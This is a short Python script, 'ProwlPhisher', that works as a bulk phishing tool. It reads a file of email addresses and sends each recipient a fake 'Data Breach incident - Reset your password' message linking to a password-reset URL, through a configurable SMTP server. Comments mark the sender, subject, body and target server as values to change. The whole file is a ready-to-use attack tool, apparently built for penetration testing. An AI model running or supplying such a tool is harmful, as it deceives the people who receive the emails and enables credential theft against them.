#!/usr/bin/env python3

## Title: ProwlPhisher - Python based Phising Tool
## Author: Mayank Deshmukh (ColdFusionX)
## Author website: https://coldfusionx.github.io
## Date: 2020-12-03

import smtplib
import sys
from email.message import EmailMessage
import argparse, textwrap
from pwn import *

parser = argparse.ArgumentParser(description="ProwlPhisher by ColdFusionX", formatter_class=argparse.RawTextHelpFormatter, 
epilog=textwrap.dedent(''' 
Script Usage : 
./prowlphisher.py -e emails.txt
'''))

parser.add_argument("-e","--emails", help="Email Wordlist") 
args = parser.parse_args()

if len(sys.argv) != 3:
    log.failure(f"Script Usage: ./prowlphisher.py -h [help] -e [emails.txt]") 
    sys.exit(1)

stats = log.progress(f"")
emailsfile = args.emails
ef = open(emailsfile).readlines()

# Sender address
sender = 'cold@fusionsecurity.cfx' #<- Change this

#Loop for Email addresses
for recipients in ef:
    recipients = recipients.strip()
    stats.status(f"Sending Mail to -> " f"{recipients}")
    
    msg = EmailMessage ()
    msg ['Subject'] = (f"Data Breach incident - Reset your password") #<- Change this
    msg ['From'] = sender
    msg ['To'] = recipients
    
#Email Body
    msg.set_content (f"Please reset your password visiting http://127.0.0.1:8020") #<- Change Email Body

#Target Server    
    try:
        mail = smtplib.SMTP ('127.0.0.1', 25) #<- Change this to Target SMTP Server
        mail.send_message (msg)
#Failure Log
    except smtplib.SMTPException:
        print()
        log.failure(f"Error Sending mail to " + recipients)
print()
log.success(f"Phising Mail Sent")
